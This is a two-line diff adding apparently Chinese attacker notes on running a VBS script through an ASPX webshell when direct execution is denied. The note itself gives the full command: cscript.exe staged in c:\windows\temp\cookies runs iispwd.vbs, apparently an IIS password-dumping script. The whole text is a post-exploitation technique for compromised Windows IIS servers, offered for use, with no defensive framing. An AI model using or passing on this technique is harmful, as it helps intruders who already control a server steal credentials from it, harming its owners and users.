@@ -1,0 +1,2 @@
+直接执行vbs没权限就在aspx马里这样执行：
+/c "c:\windows\temp\cookies\cscript.exe" c:\windows\temp\cookies\iispwd.vbs
